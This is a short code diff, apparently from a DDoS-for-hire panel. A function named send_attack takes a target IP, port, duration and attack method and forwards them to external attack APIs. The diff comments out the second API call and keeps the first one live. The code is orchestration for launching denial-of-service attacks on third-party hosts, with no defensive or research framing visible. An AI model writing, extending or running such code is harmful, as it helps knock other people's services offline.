@@ -161,9 +161,9 @@ exports.send_attack = async function(ip, port, time, method, usr) {
     console.log(rreturn);
     response += "API 1: " + await eExtra.get_api_response(rreturn) + "\r\n";
 
-    let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
-    console.log(rreturn1);
-    response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
+    // let rreturn1 = await(await fetch(Config.API_2 + ip + "&port=" + port + "&time=" + time + "&method=" + method)).text();
+    // console.log(rreturn1);
+    // response += "API 2: " + await eExtra.get_api_response(rreturn1) + "\r\n";
     return response;
 }
 
